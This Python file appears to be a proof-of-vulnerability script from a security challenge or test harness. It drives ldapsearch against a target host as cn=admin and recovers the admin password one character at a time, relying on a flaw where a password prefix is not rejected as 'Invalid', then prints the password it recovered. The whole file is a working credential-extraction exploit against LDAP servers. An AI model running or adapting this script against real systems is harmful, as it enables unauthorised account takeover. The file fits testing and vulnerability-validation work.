import sys
import socket
import random
import time
import string
import base64
import os
import string
import struct
import signal
import subprocess

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unsuccessful')
    exit(1)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        TOOLS = sys.argv[2]
    else:
        if 'HOST' in os.environ and 'TOOLS' in os.environ:
            HOST = os.environ['HOST']
            TOOLS = os.environ['TOOLS']
        else:
            print('[ERROR] HOST and TOOLS must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(120)
    
    args = [TOOLS + 'ldapsearch', '-x', '-h', HOST, '-D', 'cn=admin,dc=chess,dc=com', '-b', 'ou=People,dc=chess,dc=com', '-w'  ]

    passwd = b''

    while True:
        found = 0

        for c in list(string.ascii_letters + string.digits):
            tp = passwd + c.encode('UTF-8')   
            targs = args + [tp]

            res = subprocess.run( targs, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            if res.stderr.find(b'Invalid') == -1:
                found = 1
                passwd += c.encode('UTF-8')
                break

        if found == 0:
            if passwd == b'':
                print('[FAIL] POV was not successful')
                exit(1)
            else:
                print('[SUCCESS] Admin passwd: %s' %passwd)
                exit(0)


if __name__ == '__main__':
    main()
